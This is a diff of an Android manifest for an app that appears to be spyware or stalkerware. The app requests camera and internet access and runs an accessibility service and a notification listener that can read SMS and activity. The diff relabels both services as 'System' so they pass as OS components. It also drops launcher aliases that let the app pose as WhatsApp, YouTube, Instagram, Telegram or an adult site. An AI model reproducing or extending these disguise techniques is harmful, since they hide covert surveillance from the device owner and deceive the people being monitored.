@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="com.sync.xxx">
+    xmlns:tools="http://schemas.android.com/tools">
 
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.CAMERA" />
@@ -116,7 +115,7 @@
         <service
             android:name=".AppBlockerService"
             android:exported="true"
-            android:label="Mario Song"
+            android:label="System"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -129,7 +128,7 @@
         <service
             android:name=".SmsNotifService"
             android:exported="true"
-            android:label="Mario Song"
+            android:label="System"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
@@ -150,90 +149,19 @@
         </receiver>
 
 
-        <!-- ── Theme Aliases ── -->
-        <activity-alias
-            android:name=".AliasDefault"
-            android:targetActivity=".MainActivity"
-            android:label="Mario Song"
-            android:icon="@mipmap/ic_launcher"
-            android:roundIcon="@mipmap/ic_launcher_round"
-            android:exported="true"
-            android:enabled="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
+<!-- Main Launcher -->
+<activity
+    android:name=".MainActivity"
+    android:exported="true"
+    android:launchMode="singleTask"
+    android:windowSoftInputMode="adjustResize">
 
-        <activity-alias
-            android:name=".AliasWhatsApp"
-            android:targetActivity=".MainActivity"
-            android:label="WhatsApp"
-            android:icon="@mipmap/ic_theme_whatsapp"
-            android:roundIcon="@mipmap/ic_theme_whatsapp"
-            android:exported="true"
-            android:enabled="false">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+    </intent-filter>
 
-        <activity-alias
-            android:name=".AliasYouTube"
-            android:targetActivity=".MainActivity"
-            android:label="YouTube"
-            android:icon="@mipmap/ic_theme_youtube"
-            android:roundIcon="@mipmap/ic_theme_youtube"
-            android:exported="true"
-            android:enabled="false">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".AliasInstagram"
-            android:targetActivity=".MainActivity"
-            android:label="Instagram"
-            android:icon="@mipmap/ic_theme_instagram"
-            android:roundIcon="@mipmap/ic_theme_instagram"
-            android:exported="true"
-            android:enabled="false">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".AliasTelegram"
-            android:targetActivity=".MainActivity"
-            android:label="Telegram"
-            android:icon="@mipmap/ic_theme_telegram"
-            android:roundIcon="@mipmap/ic_theme_telegram"
-            android:exported="true"
-            android:enabled="false">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <activity-alias
-            android:name=".AliasXNXX"
-            android:targetActivity=".MainActivity"
-            android:label="XNXX"
-            android:icon="@mipmap/ic_theme_xnxx"
-            android:roundIcon="@mipmap/ic_theme_xnxx"
-            android:exported="true"
-            android:enabled="false">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
+</activity>
 
     </application>
 
